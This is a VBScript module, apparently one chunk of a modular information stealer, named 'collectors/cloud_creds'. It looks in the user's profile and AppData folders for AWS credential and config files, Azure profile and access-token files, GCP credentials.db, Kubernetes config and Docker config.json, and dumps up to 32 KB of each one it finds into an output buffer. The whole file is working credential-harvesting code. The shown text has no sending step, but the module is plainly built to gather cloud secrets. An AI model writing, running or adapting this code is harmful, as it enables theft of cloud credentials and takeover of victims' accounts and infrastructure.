' chunk: collectors/cloud_creds
' depends: core/emit_buffer, core/file_ops
' provides: collect_cloud_creds
' format: vbscript

Sub collect_cloud_creds()
    emit vbCrLf & "=== CLOUD CREDENTIALS ===" & vbCrLf
    Dim home, appData
    home = _s.ExpandEnvironmentStrings("%USERPROFILE%")
    appData = _s.ExpandEnvironmentStrings("%APPDATA%")
    Dim names, paths, i
    names = Array("AWS credentials", "AWS config", "Azure profile", "Azure tokens", _
                  "GCP creds", "GCP properties", "Kube config", "Docker config")
    paths = Array(home & "\.aws\credentials", home & "\.aws\config", _
                  home & "\.azure\azureProfile.json", home & "\.azure\accessTokens.json", _
                  appData & "\gcloud\credentials.db", appData & "\gcloud\properties", _
                  home & "\.kube\config", home & "\.docker\config.json")
    For i = 0 To UBound(names)
        If file_exists_f(paths(i)) Then
            emit "  " & names(i) & ": FOUND" & vbCrLf
            emit read_file(paths(i), 32768)
            emit vbCrLf
        End If
    Next
End Sub
